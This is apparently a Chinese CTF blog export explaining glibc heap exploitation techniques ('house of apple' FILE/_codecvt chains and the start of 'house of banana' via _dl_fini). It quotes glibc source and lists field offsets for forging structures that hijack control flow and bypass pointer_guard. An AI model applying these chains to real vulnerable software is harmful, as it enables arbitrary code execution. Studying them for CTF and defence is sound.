&#125;            else if (count &lt;= 0)                count = 0;            else            &#123;                wchar_t *p = fp-&gt;_wide_data-&gt;_IO_read_ptr;                int i = (int) count;                while (--i &gt;= 0)                    *s++ = *p++;                fp-&gt;_wide_data-&gt;_IO_read_ptr = p;            &#125;            more -= count;        &#125;        if (more == 0 || __wunderflow (fp) == WEOF)            break;    &#125;    return n - more;&#125;libc_hidden_def (_IO_wdefault_xsgetn)\n\n需要设置fp-&gt;_wide_data-&gt;_IO_read_ptr == fp-&gt;_wide_data-&gt;_IO_read_end，使得count为0，不进入if分支。\nwint_t    __wunderflow (FILE *fp)&#123;    if (fp-&gt;_mode &lt; 0 || (fp-&gt;_mode == 0 &amp;&amp; _IO_fwide (fp, 1) != 1))        return WEOF;    if (fp-&gt;_mode == 0)        _IO_fwide (fp, 1);    if (_IO_in_put_mode (fp))        if (_IO_switch_to_wget_mode (fp) == EOF)            return WEOF;    ......&#125;\n\n需要设置fp-&gt;mode &gt; 0，并且fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING != 0。\nint    _IO_switch_to_wget_mode (FILE *fp)&#123;    if (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)        if ((wint_t)_IO_WOVERFLOW (fp, WEOF) == WEOF)            return EOF;    .....&#125;\n\n需要设置fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base\n构造方式：\n\n_flags设置为0x800\nvtable设置为_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps地址（加减偏移），使其能成功调用_IO_wdefault_xsgetn即可\n_mode设置为大于0，即满足*(fp + 0xc0) &gt; 0\n_wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A\n_wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr设置为0，即满足*(A + 8) = *A\n_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base，即满足*(A + 0x20) &gt; *(A + 0x18)\n_wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B\n_wide_data-&gt;_wide_vtable-&gt;overflow设置为地址C用于劫持RIP，即满足*(B + 0x18) = C\n\nhouse of apple3前两篇文章中的利用链主要关注_wide_data成员，而本篇文章并不会特别关注_wide_data，而是关注FILE结构体的另外一个成员_codecvt的利用。\n利用条件\n已知heap地址和glibc地址\n能控制程序执行IO操作，包括但不限于：从main函数返回、调用exit函数、通过__malloc_assert触发\n能控制_IO_FILE的vtable和_codecvt，一般使用largebin attack去控制\n\n注意上面提到，本篇文章并不会特别关注_wide_data成员，这是因为_wide_data设置不当的话会影响某些利用链的分支走向。但是，如果采用默认的_wide_data成员（默认会指向_IO_wide_data_2，除了_wide_vtable外其他成员均默认为0），也并不影响house of apple3的利用。因此，如果能伪造整个FILE结构体，则需要设置合适的_wide_data；如果只能伪部分FILE的成员的话，保持fp-&gt;_wide_data为默认地址即可。\n利用原理FILE结构体中有一个成员struct _IO_codecvt *_codecvt;，偏移为0x98。\nstruct _IO_codecvt&#123;  _IO_iconv_t __cd_in;  _IO_iconv_t __cd_out;&#125;;\n\n__cd_in和__cd_out是同一种类型的数据。\ntypedef struct&#123;  struct __gconv_step *step;  struct __gconv_step_data step_data;&#125; _IO_iconv_t;\n\n再观察以下结构体俩变量的定义：\nstruct __gconv_step&#123;  struct __gconv_loaded_object *__shlib_handle;  const char *__modname;   /* For internal use by glibc.  (Accesses to this member must occur     when the internal __gconv_lock mutex is acquired).  */  int __counter;   char *__from_name;  char *__to_name;   __gconv_fct __fct;  __gconv_btowc_fct __btowc_fct;  __gconv_init_fct __init_fct;  __gconv_end_fct __end_fct;   /* Information about the number of bytes needed or produced in this     step.  This helps optimizing the buffer sizes.  */  int __min_needed_from;  int __max_needed_from;  int __min_needed_to;  int __max_needed_to;   /* Flag whether this is a stateful encoding or not.  */  int __stateful;   void *__data;        /* Pointer to step-local data.  */&#125;;\n\nstruct __gconv_step_data&#123;  unsigned char *__outbuf;    /* Output buffer for this step.  */  unsigned char *__outbufend; /* Address of first byte after the output                 buffer.  */   /* Is this the last module in the chain.  */  int __flags;   /* Counter for number of invocations of the module function for this     descriptor.  */  int __invocation_counter;   /* Flag whether this is an internal use of the module (in the mb*towc*     and wc*tomb* functions) or regular with iconv(3).  */  int __internal_use;   __mbstate_t *__statep;  __mbstate_t __state;    /* This element must not be used directly by               any module; always use STATEP!  */&#125;;\n\nhouse of apple3的利用主要关注以下三个函数：__libio_codecvt_out、__libio_codecvt_in和__libio_codecvt_length。三个函数的利用点都差不多\nenum __codecvt_result    __libio_codecvt_in (struct _IO_codecvt *codecvt, __mbstate_t *statep,                        const char *from_start, const char *from_end,                        const char **from_stop,                        wchar_t *to_start, wchar_t *to_end, wchar_t **to_stop)&#123;    enum __codecvt_result result;    struct __gconv_step *gs = codecvt-&gt;__cd_in.step;    int status;    size_t dummy;    const unsigned char *from_start_copy = (unsigned char *) from_start;    codecvt-&gt;__cd_in.step_data.__outbuf = (unsigned char *) to_start;    codecvt-&gt;__cd_in.step_data.__outbufend = (unsigned char *) to_end;    codecvt-&gt;__cd_in.step_data.__statep = statep;    __gconv_fct fct = gs-&gt;__fct;    #ifdef PTR_DEMANGLE    if (gs-&gt;__shlib_handle != NULL)        PTR_DEMANGLE (fct);    #endif    status = DL_CALL_FCT (fct,                          (gs, &amp;codecvt-&gt;__cd_in.step_data, &amp;from_start_copy,                           (const unsigned char *) from_end, NULL,                           &amp;dummy, 0, 0));    ......&#125;\n\ntypedef int (*__gconv_fct) (struct __gconv_step *, struct __gconv_step_data *,                const unsigned char **, const unsigned char *,                unsigned char **, size_t *, int, int); #ifndef DL_CALL_FCT# define DL_CALL_FCT(fct, args) fct args#endif\n\n这里呢最后这个宏就是调用fct (gs, …)\n在_IO_wfile_underflow函数中调用了__libio_codecvt_in\nwint_t    _IO_wfile_underflow (FILE *fp)&#123;    struct _IO_codecvt *cd;    enum __codecvt_result status;    ssize_t count;    /* C99 requires EOF to be &quot;sticky&quot;.  */    if (fp-&gt;_flags &amp; _IO_EOF_SEEN)        return WEOF;    if (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))    &#123;        fp-&gt;_flags |= _IO_ERR_SEEN;        __set_errno (EBADF);        return WEOF;    &#125;    if (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)        return *fp-&gt;_wide_data-&gt;_IO_read_ptr;    cd = fp-&gt;_codecvt;    /* Maybe there is something left in the external buffer.  */    if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)    &#123;        /* There is more in the external.  Convert it.  */        const char *read_stop = (const char *) fp-&gt;_IO_read_ptr;        fp-&gt;_wide_data-&gt;_IO_last_state = fp-&gt;_wide_data-&gt;_IO_state;        fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_read_ptr =            fp-&gt;_wide_data-&gt;_IO_buf_base;        status = __libio_codecvt_in (cd, &amp;fp-&gt;_wide_data-&gt;_IO_state,                                     fp-&gt;_IO_read_ptr, fp-&gt;_IO_read_end,                                     &amp;read_stop,                                     fp-&gt;_wide_data-&gt;_IO_read_ptr,                                     fp-&gt;_wide_data-&gt;_IO_buf_end,                                     &amp;fp-&gt;_wide_data-&gt;_IO_read_end);        ......    &#125;&#125;\n\n_IO_wfile_underflow又是_IO_wfile_jumps这个_IO_jump_t类型变量的成员函数\n所以总的来说利用方式为：劫持或者伪造FILE结构体的fp-&gt;vtable为_IO_wfile_jumps，fp-&gt;_codecvt为可控堆地址，当程序执行IO操作时，控制程序执行流走到_IO_wfile_underflow，设置好fp-&gt;codecvt-&gt;__cd_in结构体，使得最终调用到__libio_codecvt_in中的DL_CALL_FCT宏，伪造函数指针，进而控制程序执行流。需要注意的是设置gs-&gt;__shlib_handle == NULL绕过__pointer_guard指针的加密保护\n利用思路因为原文作者确实非常牛逼，甚至链都找好了，所以这里还是贴上原文的内容\n_IO_wfile_underflow调用链：_IO_wfile_underflow=&gt;__libio_codecvt_in=&gt;DL_CALL_FCT=&gt;gs =fp-&gt;_codecvt-&gt;__cd_in.step=&gt;*(gs-&gt;__fct)(gs)\n这条链是在利用原理当作示例的一条，所以这里只给出构造方式：\n\n_flags设置为~(4 | 0x10)\nvtable设置为_IO_wfile_jumps地址（加减偏移），使其能成功调用_IO_wfile_underflow即可\nfp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end，即满足*(fp + 8) &lt; *(fp + 0x10)\n_wide_data保持默认，或者设置为堆地址，假设其地址为A，即满足*(fp + 0xa0) = A\n_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end，即满足*A &gt;= *(A + 8)\n_codecvt设置为可控堆地址B，即满足*(fp + 0x98) = B\ncodecvt-&gt;__cd_in.step设置为可控堆地址C，即满足*B = C\ncodecvt-&gt;__cd_in.step-&gt;__shlib_handle设置为0，即满足*C = 0\ncodecvt-&gt;__cd_in.step-&gt;__fct设置为地址D,地址D用于控制rip，即满足*(C + 0x28) = D。当调用到D的时候，此时的rdi为C。如果_wide_data也可控的话，rsi也能控制。\n\n_IO_wfile_underflow_mmap调用链：_IO_wfile_underflow_mmap=&gt;__libio_codecvt_in=&gt;DL_CALL_FCT=&gt;gs=fp-&gt;_codecvt-&gt;__cd_in.step=&gt;*(gs-&gt;__fct)(gs)\nstatic wint_t    _IO_wfile_underflow_mmap (FILE *fp)&#123;    struct _IO_codecvt *cd;    const char *read_stop;    if (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))    &#123;        fp-&gt;_flags |= _IO_ERR_SEEN;        __set_errno (EBADF);        return WEOF;    &#125;    if (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)        return *fp-&gt;_wide_data-&gt;_IO_read_ptr;    cd = fp-&gt;_codecvt;    /* Maybe there is something left in the external buffer.  */    if (fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end        /* No.  But maybe the read buffer is not fully set up.  */        &amp;&amp; _IO_file_underflow_mmap (fp) == EOF)        /* Nothing available.  _IO_file_underflow_mmap has set the EOF or error       flags as appropriate.  */        return WEOF;    /* There is more in the external.  Convert it.  */    read_stop = (const char *) fp-&gt;_IO_read_ptr;    if (fp-&gt;_wide_data-&gt;_IO_buf_base == NULL)    &#123;        /* Maybe we already have a push back pointer.  */        if (fp-&gt;_wide_data-&gt;_IO_save_base != NULL)        &#123;            free (fp-&gt;_wide_data-&gt;_IO_save_base);            fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;        &#125;        _IO_wdoallocbuf (fp);    &#125;    fp-&gt;_wide_data-&gt;_IO_last_state = fp-&gt;_wide_data-&gt;_IO_state;    fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_read_ptr =        fp-&gt;_wide_data-&gt;_IO_buf_base;    __libio_codecvt_in (cd, &amp;fp-&gt;_wide_data-&gt;_IO_state,                        fp-&gt;_IO_read_ptr, fp-&gt;_IO_read_end,                        &amp;read_stop,                        fp-&gt;_wide_data-&gt;_IO_read_ptr,                        fp-&gt;_wide_data-&gt;_IO_buf_end,                        &amp;fp-&gt;_wide_data-&gt;_IO_read_end);    ......&#125;\n\n需要设置fp-&gt;_flags &amp; _IO_NO_READS == 0，设置fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end，设置fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end不进入调用，设置fp-&gt;_wide_data-&gt;_IO_buf_base != NULL不进入调用。\n构造方法：\n\n_flags设置为~4\nvtable设置为_IO_wfile_jumps_mmap地址（加减偏移），使其能成功调用_IO_wfile_underflow_mmap即可\n_IO_read_ptr &lt; _IO_read_end，即满足*(fp + 8) &lt; *(fp + 0x10)\n_wide_data保持默认，或者设置为堆地址，假设其地址为A，即满足*(fp + 0xa0) = A\n_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end，即满足*A &gt;= *(A + 8)\n_wide_data-&gt;_IO_buf_base设置为非0，即满足*(A + 0x30) != 0\n_codecvt设置为可控堆地址B，即满足*(fp + 0x98) = B\ncodecvt-&gt;__cd_in.step设置为可控堆地址C，即满足*B = C\ncodecvt-&gt;__cd_in.step-&gt;__shlib_handle设置为0，即满足*C = 0\ncodecvt-&gt;__cd_in.step-&gt;__fct设置为地址D,地址D用于控制rip，即满足*(C + 0x28) = D。当调用到D的时候，此时的rdi为C。如果_wide_data也可控的话，rsi也能控制。\n\n_IO_wdo_write调用链：_IO_new_file_sync=&gt;_IO_do_flush=&gt;_IO_wdo_write=&gt;__libio_codecvt_out=&gt;DL_CALL_FCT=&gt;gs = fp-&gt;_codecvt-&gt;__cd_out.step=&gt;*(gs-&gt;__fct)(gs)\nint    _IO_new_file_sync (FILE *fp)&#123;    ssize_t delta;    int retval = 0;    /*    char* ptr = cur_ptr(); */    if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)        if (_IO_do_flush(fp)) return EOF;    ......&#125;\n\n满足fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base。\n#define _IO_do_flush(_f) \\  ((_f)-&gt;_mode &lt;= 0                                  \\   ? _IO_do_write(_f, (_f)-&gt;_IO_write_base,                      \\          (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)              \\   : _IO_wdo_write(_f, (_f)-&gt;_wide_data-&gt;_IO_write_base,              \\           ((_f)-&gt;_wide_data-&gt;_IO_write_ptr                  \\            - (_f)-&gt;_wide_data-&gt;_IO_write_base)))\n\n使fp-&gt;_mode &gt; 0。\nint    _IO_wdo_write (FILE *fp, const wchar_t *data, size_t to_do)&#123;    struct _IO_codecvt *cc = fp-&gt;_codecvt;    if (to_do &gt; 0)    &#123;        if (fp-&gt;_IO_write_end == fp-&gt;_IO_write_ptr            &amp;&amp; fp-&gt;_IO_write_end != fp-&gt;_IO_write_base)        &#123;            if (_IO_new_do_write (fp, fp-&gt;_IO_write_base,                                  fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base) == EOF)                return WEOF;        &#125;        ......            /* Now convert from the internal format into the external buffer.  */            result = __libio_codecvt_out (cc, &amp;fp-&gt;_wide_data-&gt;_IO_state,                                          data, data + to_do, &amp;new_data,                                          write_ptr,                                          buf_end,                                          &amp;write_ptr);        ......    &#125;&#125;\n\n满足fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base，然后这个判断需要为假fp-&gt;_IO_write_end == fp-&gt;_IO_write_ptr &amp;&amp; fp-&gt;_IO_write_end != fp-&gt;_IO_write_base。\n构造方式：\n\nvtable设置为_IO_file_jumps地址（加减偏移），使其能成功调用_IO_new_file_sync即可\n_IO_write_ptr &gt; _IO_write_base，即满足*(fp + 0x28) &gt; *(fp + 0x20)\n_mode &gt; 0，即满足(fp + 0xc0) &gt; 0\n_IO_write_end != _IO_write_ptr或者_IO_write_end == _IO_write_base，即满足*(fp + 0x30) != *(fp + 0x28)或者*(fp + 0x30) == *(fp + 0x20)\n_wide_data设置为堆地址，假设地址为A，即满足*(fp + 0xa0) = A\n_wide_data-&gt;_IO_write_ptr &gt;= _wide_data-&gt;_IO_write_base，即满足*(A + 0x20) &gt;= *(A + 0x18)\n_codecvt设置为可控堆地址B，即满足*(fp + 0x98) = B\ncodecvt-&gt;__cd_out.step设置为可控堆地址C，即满足*(B + 0x38) = C\ncodecvt-&gt;__cd_out.step-&gt;__shlib_handle设置为0，即满足*C = 0\ncodecvt-&gt;__cd_out.step-&gt;__fct设置为地址D,地址D用于控制rip，即满足*(C + 0x28) = D。当调用到D的时候，此时的rdi为C。如果_wide_data也可控的话，rsi也能控制。\n\n_IO_wfile_sync调用链：_IO_wfile_sync=&gt;__libio_codecvt_length=&gt;DL_CALL_FCT=&gt;gs = fp-&gt;_codecvt-&gt;__cd_in.step=&gt;*(gs-&gt;__fct)(gs)\nwint_t    _IO_wfile_sync (FILE *fp)&#123;    ssize_t delta;    wint_t retval = 0;    /*    char* ptr = cur_ptr(); */    if (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)        if (_IO_do_flush (fp))            return WEOF;    delta = fp-&gt;_wide_data-&gt;_IO_read_ptr - fp-&gt;_wide_data-&gt;_IO_read_end;    if (delta != 0)    &#123;        /* We have to find out how many bytes we have to go back in the     external buffer.  */        struct _IO_codecvt *cv = fp-&gt;_codecvt;        off64_t new_pos;        int clen = __libio_codecvt_encoding (cv);        if (clen &gt; 0)            /* It is easy, a fixed number of input bytes are used for each       wide character.  */            delta *= clen;        else        &#123;            /* We have to find out the hard way how much to back off.         To do this we determine how much input we needed to         generate the wide characters up to the current reading         position.  */            int nread;            size_t wnread = (fp-&gt;_wide_data-&gt;_IO_read_ptr                             - fp-&gt;_wide_data-&gt;_IO_read_base);            fp-&gt;_wide_data-&gt;_IO_state = fp-&gt;_wide_data-&gt;_IO_last_state;            nread = __libio_codecvt_length (cv, &amp;fp-&gt;_wide_data-&gt;_IO_state,                                            fp-&gt;_IO_read_base,                                            fp-&gt;_IO_read_end, wnread);            ......        &#125;    &#125;&#125;\n\n设置fp-&gt;_wide_data-&gt;_IO_write_ptr &lt;= fp-&gt;_wide_data-&gt;_IO_write_base和fp-&gt;_wide_data-&gt;_IO_read_ptr - fp-&gt;_wide_data-&gt;_IO_read_end != 0。可以看到这里还需要绕过__libio_codecvt_encoding函数\nint__libio_codecvt_encoding (struct _IO_codecvt *codecvt)&#123;  /* See whether the encoding is stateful.  */  if (codecvt-&gt;__cd_in.step-&gt;__stateful)    return -1;  /* Fortunately not.  Now determine the input bytes for the conversion     necessary for each wide character.  */  if (codecvt-&gt;__cd_in.step-&gt;__min_needed_from      != codecvt-&gt;__cd_in.step-&gt;__max_needed_from)    /* Not a constant value.  */    return 0;   return codecvt-&gt;__cd_in.step-&gt;__min_needed_from;&#125;\n\n设置fp-&gt;codecvt-&gt;__cd_in.step-&gt;__stateful != 0即可返回-1。\n构造方式：\n\n_flags设置为~(4 | 0x10)\nvtable设置为_IO_wfile_jumps地址（加减偏移），使其能成功调用_IO_wfile_sync即可\n_wide_data设置为堆地址，假设其地址为A，即满足*(fp + 0xa0) = A\n_wide_data-&gt;_IO_write_ptr &lt;= _wide_data-&gt;_IO_write_base，即满足*(A + 0x20) &lt;= *(A + 0x18)\n_wide_data-&gt;_IO_read_ptr != _wide_data-&gt;_IO_read_end，即满足*A != *(A + 8)\n_codecvt设置为可控堆地址B，即满足*(fp + 0x98) = B\ncodecvt-&gt;__cd_in.step设置为可控堆地址C，即满足*B = C\ncodecvt-&gt;__cd_in.step-&gt;__stateful设置为非0，即满足*(B + 0x58) != 0\ncodecvt-&gt;__cd_in.step-&gt;__shlib_handle设置为0，即满足*C = 0\ncodecvt-&gt;__cd_in.step-&gt;__fct设置为地址D,地址D用于控制rip，即满足*(C + 0x28) = D。当调用到D的时候，此时的rdi为C。如果rsi为&amp;codecvt-&gt;__cd_in.step_data可控。\n\n总结house of apple1主要作用就是实现任意地址写，而我认为house of apple2是最吊的，一定程度上减少了覆盖这个SB pointer_guard。而house of apple3在构造方面要求相对来说较为苛刻。(我还跟个SB一样准备自己写pack_file函数来构造IO_FILE结构体，但是我发现pwntools居然有FileStructure()这个函数可以直接生成)\n\n参考链接：\nhttps://bbs.pediy.com/thread-273832.htm#msg_header_h3_2\nhttps://bbs.pediy.com/thread-273863.htm#msg_header_h3_3\n","categories":["pwn"],"tags":["house of 系列"]},{"title":"house of banana","url":"/2022/03/07/house-of-banana/","content":"\n这个堆利用方式相较于以往的利用方式存在利用目标的不同，这一方式的利用我感觉比较适合与glibc2.31之后，比较之前都可以直接用FSOP，但是在2.31之后FSOP的利用方式就是house of pig不过如果题目禁止了__free_hook之类的被篡改的话也就没法利用了，而house of banana把攻击层面转向了ld\n\n首先，在main执行之后会执行__libc_csu_fini所以我们首先了解这个函数\n如何执行fini-array中的函数void_dl_fini (void)&#123;  /* Lots of fun ahead.  We have to call the destructors for all still     loaded objects, in all namespaces.  The problem is that the ELF     specification now demands that dependencies between the modules     are taken into account.  I.e., the destructor for a module is     called before the ones for any of its dependencies.     To make things more complicated, we cannot simply use the reverse     order of the constructors.  Since the user might have loaded objects     using `dlopen&#x27; there are possibly several other modules with its     dependencies to be taken into account.  Therefore we have to start     determining the order of the modules once again from the beginning.  */  /* We run the destructors of the main namespaces last.  As for the     other namespaces, we pick run the destructors in them in reverse     order of the namespace ID.  */#ifdef SHARED  int do_audit = 0; again:#endif  for (Lmid_t ns = GL(dl_nns) - 1; ns &gt;= 0; --ns)    &#123;      /* Protect against concurrent loads and unloads.  */      __rtld_lock_lock_recursive (GL(dl_load_lock));      unsigned int nloaded = GL(dl_ns)[ns]._ns_nloaded;      /* No need to do anything for empty namespaces or those used for\t auditing DSOs.  */      if (nloaded == 0#ifdef SHARED\t  || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit#endif\t  )\t__rtld_lock_unlock_recursive (GL(dl_load_lock));      else\t&#123;\t  /* Now we can allocate an array to hold all the pointers and\t     copy the pointers in.  */\t  struct link_map *maps[nloaded];\t  unsigned int i;\t  struct link_map *l;\t  assert (nloaded != 0 || GL(dl_ns)[ns]._ns_loaded == NULL);\t  for (l = GL(dl_ns)[ns]._ns_loaded, i = 0; l != NULL; l = l-&gt;l_next)\t    /* Do not handle ld.so in secondary namespaces.  */\t    if (l == l-&gt;l_real)\t      &#123;\t\tassert (i &lt; nloaded);\t\tmaps[i] = l;\t\tl-&gt;l_idx = i;\t\t++i;\t\t/* Bump l_direct_opencount of all objects so that they\t\t   are not dlclose()ed from underneath us.  */\t\t++l-&gt;l_direct_opencount;\t      &#125;\t  assert (ns != LM_ID_BASE || i == nloaded);\t  assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - 1);\t  unsigned int nmaps = i;\t  /* Now we have to do the sorting.  We can skip looking for the\t     binary itself which is at the front of the search list for\t     the main namespace.  */\t  _dl_sort_maps (maps + (ns == LM_ID_BASE), nmaps - (ns == LM_ID_BASE),\t\t\t NULL, true);\t  /* We do not rely on the linked list of loaded object anymore\t     from this point on.  We have our own list here (maps).  The\t     various members of this list cannot vanish since the open\t     count is too high and will be decremented in this loop.  So\t     we release the lock so that some code which might be called\t     from a destructor can directly or indirectly access the\t     lock.  */\t  __rtld_lock_unlock_recursive (GL(dl_load_lock));\t  /* &#x27;maps&#x27; now contains the objects in the right order.  Now\t     call the destructors.  We have to process this array from\t     the front.  */\t  for (i = 0; i &lt; nmaps; ++i)\t    &#123;\t      struct link_map *l = maps[i];\t      if (l-&gt;l_init_called)\t\t&#123;\t\t  /* Make sure nothing happens if we are called twice.  */\t\t  l-&gt;l_init_called = 0;\t\t  /* Is there a destructor function?  */\t\t  if (l-&gt;l_info[DT_FINI_ARRAY] != NULL\t\t      || l-&gt;l_info[DT_FINI] != NULL)\t\t    &#123;\t\t      /* When debugging print a message first.  */\t\t      if (__builtin_expect (GLRO(dl_debug_mask)\t\t\t\t\t    &amp; DL_DEBUG_IMPCALLS, 0))\t\t\t_dl_debug_printf (&quot;\\ncalling fini: %s [%lu]\\n\\n&quot;,\t\t\t\t\t  DSO_FILENAME (l-&gt;l_name),\t\t\t\t\t  ns);\t\t      /* First see whether an array is given.  */\t\t      if (l-&gt;l_info[DT_FINI_ARRAY] != NULL)\t\t\t&#123;\t\t\t  ElfW(Addr) *array =\t\t\t    (ElfW(Addr) *) (l-&gt;l_addr\t\t\t\t\t    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);\t\t\t  unsigned int i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val\t\t\t\t\t    / sizeof (ElfW(Addr)));\t\t\t  while (i-- &gt; 0)\t\t\t    ((fini_t) array[i]) ();\t\t\t&#125;\t\t      /* Next try the old-style destructor.  */\t\t      if (l-&gt;l_info[DT_FINI] != NULL)\t\t\tDL_CALL_DT_FINI\t\t\t  (l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);\t\t    &#125;... ...\n\n可以看到最后调用了array[i]()，不过我们需要控制array的话就需要进一步知道这是什么。\n利用原理for (l = GL(dl_ns)[ns]._ns_loaded, i = 0; l != NULL; l = l-&gt;l_next)    /* Do not handle ld.so in secondary namespaces.  */    if (l == l-&gt;l_real)    &#123;        assert (i &lt; nloaded);        maps[i] = l;        l-&gt;l_idx = i;        ++i;        /* Bump l_direct_opencount of all objects so that they\t\t   are not dlclose()ed from underneath us.  */        ++l-&gt;l_direct_opencount;    &#125;\n\n可以看到下面的其实是和这一部分有关的\n其中的GL就是\n#  define GL(name) _rtld_global._##name\n\n下面就是_rtld_global这个结构体，但是这个结构体相对比较复杂\nstruct rtld_global&#123;#endif  /* Don&#x27;t change the order of the following elements.  &#x27;dl_loaded&#x27;     must remain the first element.  Forever.  *//* Non-shared code has no support for multiple namespaces.  */#ifdef SHARED# define DL_NNS 16#else# define DL_NNS 1#endif  EXTERN struct link_namespaces  &#123;    /* A pointer to the map for the main map.  */    struct link_map *_ns_loaded;    /* Number of object in the _dl_loaded list.  */    unsigned int _ns_nloaded;    /* Direct pointer to the searchlist of the main object.  */    struct r_scope_elem *_ns_main_searchlist;    /* This is zero at program start to signal that the global scope map is       allocated by rtld.  Later it keeps the size of the map.  It might be       reset if in _dl_close if the last global object is removed.  */    unsigned int _ns_global_scope_alloc;    /* During dlopen, this is the number of objects that still need to       be added to the global scope map.  It has to be taken into       account when resizing the map, for future map additions after       recursive dlopen calls from ELF constructors.  */    unsigned int _ns_global_scope_pending_adds;    /* Search table for unique objects.  */    struct unique_sym_table    &#123;      __rtld_lock_define_recursive (, lock)      struct unique_sym      &#123;\tuint32_t hashval;\tconst char *name;\tconst ElfW(Sym) *sym;\tconst struct link_map *map;      &#125; *entries;      size_t size;      size_t n_elements;      void (*free) (void *);    &#125; _ns_unique_sym_table;    /* Keep track of changes to each namespace&#x27; list.  */    struct r_debug _ns_debug;  &#125; _dl_ns[DL_NNS];... ...\n\n通过上面的for循环可以看到其实我们利用的也只是其中的dl_ns部分，所以下面的我就省略了。然后其中又是另一个结构体这里就不继续深挖了。\n这里根据上面的内容可以看出来的是 array = (l-&gt;l_addr + l-&gt;l_info[DT_FINI_ARRAY\\]-&gt;d_un.d_ptr);\n再根据上面的for循环最后使用的是l=l-&gt;next可以看出来其实这是一个存在链表操作的结构，所以我们只需要伪造链表当中的其中一个结构体就行。\n再次看到这个赋值操作：\nfor (l = GL(dl_ns)[ns]._ns_loaded, i = 0; l != NULL; l = l-&gt;l_next)    /* Do not handle ld.so in secondary namespaces.  */    if (l == l-&gt;l_real)    &#123;        assert (i &lt; nloaded);        maps[i] = l;        l-&gt;l_idx = i;        ++i;        /* Bump l_direct_opencount of all objects so that they\t\t   are not dlclose()ed from underneath us.  */        ++l-&gt;l_direct_opencount;    &#125;assert (ns != LM_ID_BASE || i == nloaded);assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - 1);\n\n这里的maps需要的是4个元素，所以我们劫持第三个l-&gt;next到我们伪造的结构当中即可，并且可以绕过下面两个assert\n\n所以我们利用distance求出偏移然后修改掉&amp;_rtld_global-0x1e048的地址到我们伪造的结构体就行，另外在这一代码当中存在一个if判断，需要绕过这一if判断\n\n\n所以我们只需要在fake+0x28=fake就可\n现在的目标就是进行伪造，能够顺利的执行到最后\nif (l-&gt;l_init_called)&#123;    /* Make sure nothing happens if we are called twice.  */    l-&gt;l_init_called = 0;    /* Is there a destructor function?  */    if (l-&gt;l_info[DT_FINI_ARRAY] != NULL        || l-&gt;l_info[DT_FINI] != NULL)    &#123;        /* When debugging print a message first.  */        if (__builtin_expect (GLRO(dl_debug_mask)                              &amp; DL_DEBUG_IMPCALLS, 0))            _dl_debug_printf (&quot;\\ncalling fini: %s [%lu]\\n\\n&quot;,                              DSO_FILENAME (l-&gt;l_name),                              ns);        /* First see whether an array is given.  */        if (l-&gt;l_info[DT_FINI_ARRAY] != NULL)        &#123;            ElfW(Addr) *array =                (ElfW(Addr) *) (l-&gt;l_addr                                + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);            unsigned int i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val                              / sizeof (ElfW(Addr)));            while (i-- &gt; 0)                ((fini_t) array[i]) ();        &#125;\n\n可以看到这里存在的是三个if判断\n\n首先是l_init_called可以看到他们之间的距离为0x314然后地址上的值为0x1c，所以只需要fake+0x314=0x1c即可绕过。(在glibc2.31当中的距离为0x31c，上面没注意使用的是glibc2.27下面改用2.31)\n随后就是下面两个if语句，fake-&gt;l_info[26]和fake-&gt;l_info[28]!=NULL即可绕过，然后可以看到下面这两个其实直接控制了，array和i的值，所以我们需要利用好这两个。\nElfW(Addr) *array =\t\t\t    (ElfW(Addr) *) (l-&gt;l_addr\t\t\t\t\t    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);\t\t\t  unsigned int i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val\t\t\t\t\t    / sizeof (ElfW(Addr)));------#define\tDT_FINI_ARRAY\t26\t\t/* Array with addresses of fini fct */#define\tDT_FINI_ARRAYSZ\t28\t\t/* Size in bytes of DT_FINI_ARRAY 